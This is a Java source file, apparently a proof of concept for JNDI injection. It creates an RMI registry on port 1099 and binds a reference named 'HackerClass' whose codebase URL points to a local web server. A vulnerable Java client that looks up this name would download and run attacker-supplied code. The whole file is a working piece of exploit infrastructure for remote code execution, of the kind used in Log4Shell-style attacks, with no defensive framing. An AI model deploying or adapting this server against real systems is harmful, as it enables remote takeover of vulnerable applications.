package com.example.hacker;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author zhanghaoyang
 */
public class RMIServer {

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException, Exception {
        Registry r = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("HackerClass", "HackerClass",
                "http://127.0.0.1:8080/");
        Remote remote = (Remote) Class.forName("com.sun.jndi.rmi.registry.ReferenceWrapper").getConstructor(Reference.class)
                .newInstance(reference);
        System.out.println(remote);
        r.bind("HackerClass", remote);

        System.out.println("server start");
    }

}
